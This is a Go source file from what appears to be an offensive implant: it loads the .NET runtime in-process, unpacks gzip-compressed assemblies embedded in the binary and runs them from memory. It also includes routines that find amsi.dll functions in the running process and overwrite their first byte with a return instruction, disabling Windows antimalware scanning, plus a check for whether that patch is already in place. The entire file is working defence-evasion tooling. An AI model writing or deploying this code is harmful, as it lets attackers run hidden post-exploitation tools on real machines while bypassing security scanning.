package execute_assembly

import (
	"compress/gzip"
	"embed"
	"fmt"
	"io"
	"io/ioutil"
	"unsafe"

	clr "github.com/Ne0nd0g/go-clr"
	"github.com/audibleblink/dllinquent"
	"github.com/audibleblink/memutils"
	"golang.org/x/sys/windows"
)

//go:embed assemblies/*
var Assemblies embed.FS

type CLR struct {
	Active string

	loaded      bool
	runtimeHost *clr.ICORRuntimeHost
	assembly    *clr.MethodInfo
}

func NewCLR() (CLR, error) {
	c := &CLR{
		loaded: false,
	}
	return c.LoadCLR()
}

func (e CLR) LoadCLR() (CLR, error) {
	err := clr.RedirectStdoutStderr()
	if err != nil {
		return e, err
	}

	e.runtimeHost, err = clr.LoadCLR("v4")
	if err != nil {
		return e, err
	}

	e.loaded = true
	return e, err
}

func (e CLR) IsLoaded() bool {
	return e.loaded
}

func (e *CLR) Load(name string) (err error) {
	assemblyBytes, err := unzippedBytes(name)
	if err != nil {
		return
	}

	e.assembly, err = clr.LoadAssembly(e.runtimeHost, assemblyBytes)
	if err != nil {
		return
	}

	e.Active = name
	return
}

func (e CLR) Execute(args []string) (stdout, stderr string) {
	stdout, stderr = clr.InvokeAssembly(e.assembly, args)
	return
}

func unzippedBytes(name string) (asmBytes []byte, err error) {
	file := fmt.Sprintf("assemblies/%s.exe.gz", name)
	gZipFile, err := Assemblies.Open(file)
	if err != nil {
		return
	}
	defer gZipFile.Close()

	gzReader, err := gzip.NewReader(gZipFile)
	if err != nil {
		return
	}
	defer gzReader.Close()

	asmBytes, err = ioutil.ReadAll(gzReader)
	if err != nil {
		return
	}

	if len(asmBytes) == 0 {
		err = fmt.Errorf("null read size for %s", name)
	}
	return
}

func HasAmsi(fn string) (hasAmsi bool, err error) {
	d1, err := dllinquent.FindInSelf("amsi.dll", fn)
	if err == io.EOF {
		err = nil
		return
	}
	if err != nil {
		return
	}
	if d1 != (dllinquent.Dll{}) {
		hasAmsi = true
	}

	var stomp byte
	err = memutils.ReadMemory(
		windows.CurrentProcess(),
		unsafe.Pointer(d1.FuncAddress),
		unsafe.Pointer(&stomp),
		1,
	)
	if err != nil {
		err = fmt.Errorf("couldn't verify if previously unhooked, so maybe? : %w", err)
		return
	}

	if stomp == 0xc3 {
		hasAmsi = false
	}

	return
}

func UnhookFunction(dllName, fn string) (dllOut dllinquent.Dll, err error) {
	ret := []byte{0xc3}
	dllOut, err = dllinquent.FindInSelf(dllName, fn)
	if err != nil {
		err = fmt.Errorf("dll list exhausted: %w", err)
		return
	}

	me := windows.CurrentProcess()
	err = memutils.JuggleWrite(me, dllOut.FuncAddress, ret)
	return
}
